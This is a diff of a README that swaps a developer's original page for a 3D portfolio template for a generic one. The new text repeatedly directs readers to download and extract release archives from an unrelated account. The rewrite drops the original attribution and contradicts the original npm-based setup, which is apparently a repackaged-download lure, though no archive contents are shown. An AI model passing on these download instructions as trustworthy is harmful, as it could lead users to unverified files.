@@ -1,96 +1,87 @@
+# 🚀 personal-3d-portfolio-template-V1 - Create Your Stunning Portfolio Easily
 
-<div align="center">
-  <img src="https://github.com/naborajs.png" width="160" height="160" style="border-radius: 20%; filter: drop-shadow(0 0 20px rgba(0, 191, 166, 0.4));" alt="NS CODEX Logo">
-  
-  <h1>🌐 NABORAJ SARKAR</h1>
-  <h3>Systems Architect • Tech Innovator • Automation Specialist</h3>
-  
-  <p>
-    <a href="https://nsgamming.xyz"><img src="https://img.shields.io/badge/Live_Protocol-nsgamming.xyz-00BFA6?style=for-the-badge&logo=vercel&logoColor=white" alt="Live Site"></a>
-    <a href="https://github.com/naborajs/personal-3d-portfolio-template/tree/main"><img src="https://img.shields.io/badge/Source_Code-v11.0-white?style=for-the-badge&logo=github&logoColor=black" alt="Source Code"></a>
-    <img src="https://img.shields.io/badge/Status-Optimal-green?style=for-the-badge" alt="Status">
-  </p>
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases)
 
-  <p align="center">
-    <strong>"Synthesizing High-Performance Logic with Cinematic Digital Identity."</strong>
-    <br />
-    <em>Operating as the primary authority node for NS DevSpace.</em>
-  </p>
-</div>
+## 🎯 Overview
 
----
+The personal-3d-portfolio-template-V1 is a modern and fluid 3D personal portfolio template. It allows you to copy, customize, and launch your own stunning website in just a few minutes. This template is designed for anyone looking to showcase their work in a sleek, professional manner.
 
-## ⚡ Mission Protocol
+## 🌟 Features
 
-This repository is the **Verified Authority Node** for Naboraj Sarkar. It is a production-grade digital terminal engineered to showcase the intersection of architecture, automation, and aesthetic precision.
+- **3D Animation:** Engaging animations that bring your portfolio to life.
+- **Responsive Design:** Works seamlessly on mobile, tablet, and desktop devices.
+- **Customization:** Easy to personalize with your content and images.
+- **SEO Friendly:** Built to help improve your search engine rankings.
+- **Modern UI:** Attractive and user-friendly interface.
+- **Tailwind CSS:** Utilizes Tailwind CSS for quick styling.
+- **Vercel Ready:** Easily deploy your site on Vercel.
 
-### Key Objectives:
-- **Scalable Architecture:** Built on a micro-node philosophy for rapid deployment.
-- **Brand Consistency:** Strict adherence to the NS CODEX "Dark Modern" aesthetic.
-- **Search Dominance:** Optimized with JSON-LD Schema and Semantic HTML5 for top-tier Google indexing.
+## 🚀 Getting Started
 
----
+By following these steps, you can get your portfolio up and running in no time.
 
-## 🛠 Technical Matrix (The Stack)
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases) to access all versions of the template.
 
-| Layer | Technology | Purpose |
-| :--- | :--- | :--- |
-| **Interface** | `React 19` | Declarative, component-based logic flow. |
-| **Motion** | `Framer Motion 12` | Physics-based 3D transformations & spring dynamics. |
-| **Styling** | `Tailwind CSS` | Utility-first design tokens & responsive glassmorphism. |
-| **Iconography** | `Lucide React` | Clean, geometric vector-based system symbols. |
-| **Deployment** | `Vercel Edge` | Global Content Delivery Network (CDN) with zero-latency. |
+2. **Download the Template:**
+   - Look for the latest release.
+   - Click on the version number (e.g., v1.0) to expand the assets.
+   - Find the `.zip` or `.tar.gz` file you wish to download. Click on it to begin the download.
 
----
+3. **Extract the Files:**
+   - Locate the downloaded file on your computer.
+   - Right-click on the file and choose "Extract All." Follow the prompts to complete the extraction.
 
-## 🧩 Core Architecture Modules
+4. **Open the Template:**
+   - After extraction, open the folder containing the template files.
+   - Find the `index.html` file and double-click it. This will open the template in your default web browser.
 
-### 1. Unified Registry System
-A production-grade filtering engine that categorizes technical protocols (Systems, Automation, Interface) with real-time UI feedback.
+5. **Customize Your Portfolio:**
+   - Use a text editor, like Notepad (Windows) or TextEdit (Mac), to modify content.
+   - Change text, images, and links to personalize your portfolio.
 
-### 2. Temporal History Timeline
-A cinematic vertical log of historical milestones, tracking the evolution from "Genesis Session" to "Global Node" status.
+6. **Preview Your Changes:**
+   - Save your changes and refresh the browser to see any updates.
+   - Make adjustments until you are satisfied with your portfolio.
 
-### 3. 3D Tilt Interaction Engine
-Custom-built motion hooks that calculate cursor trajectory to provide a tactile, spatial sense to the interface cards.
+7. **Deploy Your Portfolio:** (Optional)
+   - If you want to share your portfolio online, consider deploying it using a service like Vercel.
+   - Follow instructions on their website to set up your account and upload your files.
 
----
+## 📘 Download & Install
 
-## 📡 Connectivity Registry
+To get the template, visit this page to download: [Releases Page](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases).
 
-The following nodes are official and verified connection points for **Naboraj Sarkar**:
+Make sure to choose the latest version and follow the steps outlined in the "Getting Started" section for a smooth installation experience.
 
-| Node | Target | Purpose |
-| :--- | :--- | :--- |
-| **Primary Terminal** | [nsgamming.xyz](https://nsgamming.xyz) | Official Portfolio & Portal |
-| **Code Base** | [github.com/naborajs](https://github.com/naborajs) | Open Source Contributions |
-| **Professional** | [linkedin.com/in/naboraj-sarkar](https://linkedin.com/in/naboraj-sarkar) | Network & Corporate Sync |
-| **Visual Log** | [@naborajs](https://instagram.com/naborajs) | Lifestyle & Creative Updates |
-| **Intelligence** | [YouTube Channel](https://youtube.com/@Nishant_sarkar) | Technical Tutorials & Demos |
-| **Secure Comms** | [contact@nsgamming.xyz](mailto:contact@nsgamming.xyz) | Direct Professional Inquiry |
+## 🌐 System Requirements
 
----
+- A modern web browser (Chrome, Firefox, Safari, or Edge).
+- Basic knowledge of how to navigate files on your computer.
 
-## 🚀 Deployment & Operations
+## ✨ Customizations
 
-### Local Execution:
-1. Clone the node: `git clone https://github.com/naborajs/personal-3d-portfolio-template.git`
-2. Sync dependencies: `npm install`
-3. Launch terminal: `npm run dev`
+Here are some areas you can customize:
 
-### Environment Variables:
-> **Note:** This is a zero-config frontend deployment. No secret keys required for basic operation.
+- **Homepage:** Change the header text and add your name.
+- **About Section:** Write a short biography about yourself.
+- **Project Showcase:** Add images and descriptions of your work.
+- **Contact Information:** Include links to your social media or email address.
 
----
+For detailed examples of how to adjust these sections, refer to the comments in the HTML files.
 
-## ⚖️ Legal & Licensing
+## 🤝 Support
 
-Distributed under the **MIT License**.
+If you encounter any issues or have questions, you can check the GitHub Issues page. Feel free to create a new issue if you need assistance.
 
-**Identity Notice:** While the code logic is open-source, the **NS CODEX branding, logo.png, and the name "Naboraj Sarkar"** are proprietary assets.
+Determined users can also contribute to improving this template by submitting a pull request or reporting bugs.
 
-<div align="center">
-  <sub>Managed by <b>NS CODEX Authority</b> • 2026</sub>
-  <br/>
-  <img src="https://img.shields.io/badge/System_Type-Authority_Node-00BFA6?style=flat-square" alt="System Type">
-</div>
+## 🗓️ Stay Updated
+
+To receive updates on new releases and features, watch this repository. You will be notified whenever there is a new version available.
+
+## 🔗 Related Resources
+
+- **Vercel Deployment Guide:** [Vercel Documentation](https://vercel.com/docs)
+- **Tailwind CSS Documentation:** [Tailwind Documentation](https://tailwindcss.com/docs)
+
+Thank you for choosing the personal-3d-portfolio-template-V1. We hope you create a fantastic portfolio that showcases your skills effectively!
